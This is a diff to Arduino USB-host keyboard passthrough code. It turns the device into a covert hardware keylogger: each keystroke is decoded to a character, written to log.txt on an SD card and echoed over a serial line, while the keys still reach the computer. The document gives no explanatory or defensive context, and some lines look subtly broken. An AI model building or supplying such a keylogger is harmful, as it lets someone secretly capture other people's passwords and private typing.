@@ -1,12 +1,7 @@
 #include <Keyboard.h>
 #include <hidboot.h>
 #include <usbhub.h>
-#include <EEPROM.h>
-
-// Satisfy the IDE, which needs to see the include statment in the ino too.
-#ifdef dobogusinclude
-#include <spi4teensy3.h>
-#endif
+#include <SD.h>
 #include <SPI.h>
 
 #define MODIFIERKEY_LEFT_CTRL   (0x01)
@@ -17,6 +12,10 @@
 #define MODIFIERKEY_RIGHT_SHIFT (0x20)
 #define MODIFIERKEY_RIGHT_ALT   (0x40)
 #define MODIFIERKEY_RIGHT_GUI   (0x80)
+#define SHIFT   (0x80)
+#define ALTGR   (0x40)
+
+extern const uint8_t _asciimap[256] PROGMEM;
 
 //modifiers
 int leftctrl_status=0;
@@ -28,6 +27,10 @@ int rightshift_status=0;
 int rightalt_status=0;
 int rightgui_status=0;
 uint8_t modifiers=0;
+uint8_t modifiersard=0;
+int key_modifier;
+
+File SDlog;
 
 void SetModifiers(void) {
     modifiers=0;
@@ -39,6 +42,12 @@ void SetModifiers(void) {
     if (rightshift_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_SHIFT);
     if (rightalt_status) modifiers = (modifiers |  MODIFIERKEY_RIGHT_ALT);
     if (rightgui_status) modifiers = (modifiers | MODIFIERKEY_RIGHT_GUI);   
+};
+
+void SetModifiersArd(void) {
+    modifiersard=0;
+    if (leftshift_status) modifiersard = (modifiersard | SHIFT);
+    if (rightalt_status) modifiersard = (modifiersard |  ALTGR);   
 };
 
 class KbdRptParser : public KeyboardReportParser {
@@ -53,18 +62,24 @@ class KbdRptParser : public KeyboardReportParser {
 };
 
 void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key) {
-  
-  SetModifiers();
-  Serial1.print(key);
-  Serial1.print(" ");
-  Serial1.println(modifiers);
+  Keyboard.rawrelease(key, 0);
+  SetModifiersArd();
+  key_modifier = key|modifiersard,HEX;
+  SDlog = SD.open("log.txt", FILE_WRITE);
+
+  for (int i = 0; i < 256; i++) {
+    if(pgm_read_byte(_asciimap + i) == key_modifier){
+      SDlog.write(i);
+      SDlog.close();
+      Serial1.write(i);
+    }
+  }
 }
 
 void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key) { 
-
   SetModifiers();
   Keyboard.rawpress(key, modifiers);
-  Keyboard.releaseAll();
+  modifiers = 0;
 }
 
 void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
@@ -108,7 +123,9 @@ HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);
 KbdRptParser Prs;
 
 void setup() {
+  Serial.begin(115200);
   Serial1.begin(115200);
+  SD.begin(5);
   
   #if !defined(__MIPSEL__)
     while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
